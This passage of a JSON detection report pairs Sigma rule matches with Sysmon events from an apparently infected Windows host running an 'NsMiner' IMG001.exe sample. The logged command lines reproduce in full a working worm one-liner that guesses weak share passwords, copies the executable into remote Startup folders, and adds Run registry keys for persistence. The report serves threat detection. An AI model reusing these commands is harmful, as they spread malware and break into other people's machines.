                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C0A5-6560-3107-000000003B00}; ProcessId=3552; Product=Microsoft\\xae Windows\\xae Operating System; Description=Net Command; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C08A-6560-6C06-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570; OriginalFileName=net.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7380; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=net  use \\\\192.168.2.117\\C$ /delete /y  ; EventID=1; LogonGuid=C784477D-327C-6539-A0CC-030000000000; LogonId=248992; Image=C:\\Windows\\SysWOW64\\net.exe; IntegrityLevel=Medium; ParentCommandLine=\"C:\\Windows\\system32\\cmd.exe\" /v:on /c @(for /f \"usebackq tokens=1\" %i in (`@net view^|find /i \"\\\\\" ^|^| @arp -a^|find /i \"  1\"`) do @set str_!random!=%i)\u0026 @for /f \"usebackq tokens=1* delims==\" %j in (`set str_`) do @set s=%k\u0026 set s=!s:\\\\=!\u0026 set l=!s:-PC=!\u0026 set l=!l:-\\xcf\\xca=!\u0026 set f=IMG001.exe\u0026 set n=0201\u0026 @if not \"!s!\"==\"%COMPUTERNAME%\" @echo connect to \\\\!s! \u0026 (for /f \"usebackq tokens=1\" %j in (`net view \\\\!s!^|find /i \"    \"`) do @echo f|xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" \"\\\\!s!\\%j\\!f!\" 1\u003enul \u0026\u0026 @echo copy to \"\\\\!s!\\%j\\!f!\") \u0026 @net use * /delete /y 2\u003enul \u0026 @(for %u in (1 !l! administrator user admin \\xe0\\xe4\\xec\\xe8\\xed\\xe8\\xf1\\xf2\\xf0\\xe0\\xf2\\xee\\xf0) do @for %p in (0 1 123 %u !n! \"\") do @ping -n 3 localhost\u003enul \u0026 @(for %c in (\\\\!s!\\C$ \\\\!s!\\Users) do @echo connect to %c %p %u \u0026 @(if not \"%p%u\"==\"01\" net use %c \"%p\" /user:\"%u\") \u0026\u0026 @((echo [Section1] \u0026 echo p=%p %u)\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 @(for %d in (\"%c\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Users\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Users\\%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Documents and Settings\\%u\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Documents and Settings\\%u\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%c\\Documents and Settings\\All Users\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%c\\Windows\\Profiles\\%u\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Windows\\All Users\\Start menu\\Programs\\Startup\\!f!\" \"%c\\%u\\!f!\" ) do @echo f|@xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" %d 1\u003enul \u0026\u0026 @echo copy to %d) \u0026 @echo nul\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 net use %c /delete /y 2\u003enul \u0026 @ping -n 20 localhost\u003enul))); UtcTime=1700839589; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C0A8-6560-5407-000000003B00}; ProcessId=6336; Product=Microsoft\\xae Windows\\xae Operating System; Description=Net Command; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C08D-6560-8206-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570; OriginalFileName=net.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=4964; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=net  use \\\\192.168.2.186\\C$ /delete /y  ; EventID=1; LogonGuid=C784477D-327C-6539-A0CC-030000000000; LogonId=248992; Image=C:\\Windows\\SysWOW64\\net.exe; IntegrityLevel=Medium; ParentCommandLine=\"C:\\Windows\\system32\\cmd.exe\" /v:on /c @(for /f \"usebackq tokens=1\" %i in (`@net view^|find /i \"\\\\\" ^|^| @arp -a^|find /i \"  1\"`) do @set str_!random!=%i)\u0026 @for /f \"usebackq tokens=1* delims==\" %j in (`set str_`) do @set s=%k\u0026 set s=!s:\\\\=!\u0026 set l=!s:-PC=!\u0026 set l=!l:-\\xcf\\xca=!\u0026 set f=IMG001.exe\u0026 set n=1809\u0026 @if not \"!s!\"==\"%COMPUTERNAME%\" @echo connect to \\\\!s! \u0026 (for /f \"usebackq tokens=1\" %j in (`net view \\\\!s!^|find /i \"    \"`) do @echo f|xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" \"\\\\!s!\\%j\\!f!\" 1\u003enul \u0026\u0026 @echo copy to \"\\\\!s!\\%j\\!f!\") \u0026 @net use * /delete /y 2\u003enul \u0026 @(for %u in (1 !l! administrator user admin \\xe0\\xe4\\xec\\xe8\\xed\\xe8\\xf1\\xf2\\xf0\\xe0\\xf2\\xee\\xf0) do @for %p in (0 1 123 %u !n! \"\") do @ping -n 3 localhost\u003enul \u0026 @(for %c in (\\\\!s!\\C$ \\\\!s!\\Users) do @echo connect to %c %p %u \u0026 @(if not \"%p%u\"==\"01\" net use %c \"%p\" /user:\"%u\") \u0026\u0026 @((echo [Section1] \u0026 echo p=%p %u)\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 @(for %d in (\"%c\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Users\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Users\\%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Documents and Settings\\%u\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Documents and Settings\\%u\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%c\\Documents and Settings\\All Users\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%c\\Windows\\Profiles\\%u\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Windows\\All Users\\Start menu\\Programs\\Startup\\!f!\" \"%c\\%u\\!f!\" ) do @echo f|@xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" %d 1\u003enul \u0026\u0026 @echo copy to %d) \u0026 @echo nul\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 net use %c /delete /y 2\u003enul \u0026 @ping -n 20 localhost\u003enul))); UtcTime=1700839592; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C0C7-6560-F407-000000003B00}; ProcessId=7212; Product=Microsoft\\xae Windows\\xae Operating System; Description=Net Command; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C07E-6560-3706-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=DD0561156F62BC1958CE0E370B23711B,SHA256=FD41D0261C6D22572DA448BCB5CBBB98F78A2922D1F1074D25237CC82C8CE432,IMPHASH=86350518EAE83E4A09BBF6317BA1C570; OriginalFileName=net.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7868; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=net  use \\\\192.168.2.42\\C$ \"1\" /user:\"1\"; EventID=1; LogonGuid=C784477D-327C-6539-76CC-030000000000; LogonId=248950; Image=C:\\Windows\\SysWOW64\\net.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Windows\\system32\\cmd.exe\" /v:on /c @(for /f \"usebackq tokens=1\" %i in (`@net view^|find /i \"\\\\\" ^|^| @arp -a^|find /i \"  1\"`) do @set str_!random!=%i)\u0026 @for /f \"usebackq tokens=1* delims==\" %j in (`set str_`) do @set s=%k\u0026 set s=!s:\\\\=!\u0026 set l=!s:-PC=!\u0026 set l=!l:-\\xcf\\xca=!\u0026 set f=IMG001.exe\u0026 set n=1709\u0026 @if not \"!s!\"==\"%COMPUTERNAME%\" @echo connect to \\\\!s! \u0026 (for /f \"usebackq tokens=1\" %j in (`net view \\\\!s!^|find /i \"    \"`) do @echo f|xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" \"\\\\!s!\\%j\\!f!\" 1\u003enul \u0026\u0026 @echo copy to \"\\\\!s!\\%j\\!f!\") \u0026 @net use * /delete /y 2\u003enul \u0026 @(for %u in (1 !l! administrator user admin \\xe0\\xe4\\xec\\xe8\\xed\\xe8\\xf1\\xf2\\xf0\\xe0\\xf2\\xee\\xf0) do @for %p in (0 1 123 %u !n! \"\") do @ping -n 3 localhost\u003enul \u0026 @(for %c in (\\\\!s!\\C$ \\\\!s!\\Users) do @echo connect to %c %p %u \u0026 @(if not \"%p%u\"==\"01\" net use %c \"%p\" /user:\"%u\") \u0026\u0026 @((echo [Section1] \u0026 echo p=%p %u)\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 @(for %d in (\"%c\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Users\\All Users\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Users\\%u\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Documents and Settings\\%u\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Documents and Settings\\%u\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%c\\Documents and Settings\\All Users\\\\xc3\\xeb\\xe0\\xe2\\xed\\xee\\xe5 \\xec\\xe5\\xed\\xfe\\\\xcf\\xf0\\xee\\xe3\\xf0\\xe0\\xec\\xec\\xfb\\\\xc0\\xe2\\xf2\\xee\\xe7\\xe0\\xe3\\xf0\\xf3\\xe7\\xea\\xe0\\!f!\" \"%c\\Windows\\Profiles\\%u\\Start Menu\\Programs\\Startup\\!f!\" \"%c\\Windows\\All Users\\Start menu\\Programs\\Startup\\!f!\" \"%c\\%u\\!f!\" ) do @echo f|@xcopy /y /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" %d 1\u003enul \u0026\u0026 @echo copy to %d) \u0026 @echo nul\u003e\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe:P\" \u0026 net use %c /delete /y 2\u003enul \u0026 @ping -n 20 localhost\u003enul))); UtcTime=1700839623; RuleName=-}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "8b5db9da5732dc549b0e8b56fe5933d7c95ed760f3ac20568ab95347ef8c5bcc",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "CurrentVersion Autorun Keys Modification",
                                                                       "rule_description":  "Detects modification of autostart extensibility point (ASEP) in registry.",
                                                                       "rule_author":  "Victor Sergeev, Daniil Yugoslavskiy, Gleb Sukhodolskiy, Timur Zinniatullin, oscd.community, Tim Shelton, frack113 (split)",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{EventID=13; ProcessId=7876; EventType=SetValue; Image=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe; ProcessGuid={C784477D-C078-6560-2106-000000003B00}; UtcTime=1700839547; Details=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe; RuleName=T1060,RunKey; TargetObject=HKU\\S-1-5-21-1015118539-3749460369-599379286-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\(Default)}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=13; ProcessId=7396; EventType=SetValue; Image=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe; RuleName=T1060,RunKey; UtcTime=1700839560; Details=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe; ProcessGuid={C784477D-C084-6560-4A06-000000003B00}; TargetObject=HKU\\S-1-5-21-1015118539-3749460369-599379286-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\(Default)}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=13; ProcessId=7864; EventType=SetValue; Image=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe; RuleName=T1060,RunKey; UtcTime=1700839566; Details=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe; ProcessGuid={C784477D-C08C-6560-8006-000000003B00}; TargetObject=HKU\\S-1-5-21-1015118539-3749460369-599379286-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\(Default)}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=13; ProcessId=6160; EventType=SetValue; Image=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe; ProcessGuid={C784477D-C094-6560-A906-000000003B00}; UtcTime=1700839574; Details=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe; RuleName=T1060,RunKey; TargetObject=HKU\\S-1-5-21-1015118539-3749460369-599379286-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\(Default)}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=13; ProcessId=4140; EventType=SetValue; Image=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe; ProcessGuid={C784477D-C09C-6560-B906-000000003B00}; UtcTime=1700839582; Details=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe; RuleName=T1060,RunKey; TargetObject=HKU\\S-1-5-21-1015118539-3749460369-599379286-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\(Default)}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "aa87efb252a9cf7bb1fb0114336bd08c338bc9046dd498d187c209cd94ddbc6a",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Potential Persistence Attempt Via Run Keys Using Reg.EXE",
                                                                       "rule_description":  "Detects suspicious command line reg.exe tool adding key to RUN key in Registry",
                                                                       "rule_author":  "Florian Roth (Nextron Systems)",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C07B-6560-2706-000000003B00}; ProcessId=8176; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C078-6560-2106-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=F3BDBE3BB6F734E357235F4D5898582D,SHA256=3685495D051137B1C4EFDE22C26DF0883614B6453B762FA84588DA55ED2E7744,IMPHASH=0AF8419BE362159398343D7B31721726; OriginalFileName=Cmd.Exe; ParentImage=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7876; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=\"C:\\Windows\\system32\\cmd.exe\" /c reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"\" /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" /t REG_SZ; EventID=1; LogonGuid=C784477D-327C-6539-76CC-030000000000; LogonId=248950; Image=C:\\Windows\\SysWOW64\\cmd.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" ; UtcTime=1700839547; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C07B-6560-2E06-000000003B00}; ProcessId=3588; Product=Microsoft\\xae Windows\\xae Operating System; Description=Registry Console Tool; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C07B-6560-2706-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=CEE2A7E57DF2A159A065A34913A055C2,SHA256=829206FB125010140C40F9A8D08ECEBCBD437A50B351D420B473C13F931191CC,IMPHASH=869B9FF91668F96EF68FBE0DB3602587; OriginalFileName=reg.exe; ParentImage=C:\\Windows\\SysWOW64\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=8176; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=reg  add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"\" /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" /t REG_SZ; EventID=1; LogonGuid=C784477D-327C-6539-76CC-030000000000; LogonId=248950; Image=C:\\Windows\\SysWOW64\\reg.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Windows\\system32\\cmd.exe\" /c reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"\" /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" /t REG_SZ; UtcTime=1700839547; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-C087-6560-5606-000000003B00}; ProcessId=4504; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-C084-6560-4A06-000000003B00}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=F3BDBE3BB6F734E357235F4D5898582D,SHA256=3685495D051137B1C4EFDE22C26DF0883614B6453B762FA84588DA55ED2E7744,IMPHASH=0AF8419BE362159398343D7B31721726; OriginalFileName=Cmd.Exe; ParentImage=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7396; CurrentDirectory=C:\\Users\\george\\AppData\\Roaming\\NsMiner\\; CommandLine=\"C:\\Windows\\system32\\cmd.exe\" /c reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"\" /d \"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" /t REG_SZ; EventID=1; LogonGuid=C784477D-327C-6539-A0CC-030000000000; LogonId=248992; Image=C:\\Windows\\SysWOW64\\cmd.exe; IntegrityLevel=Medium; ParentCommandLine=\"C:\\Users\\george\\AppData\\Roaming\\NsMiner\\IMG001.exe\" ; UtcTime=1700839559; RuleName=-}"
                                                                                             },
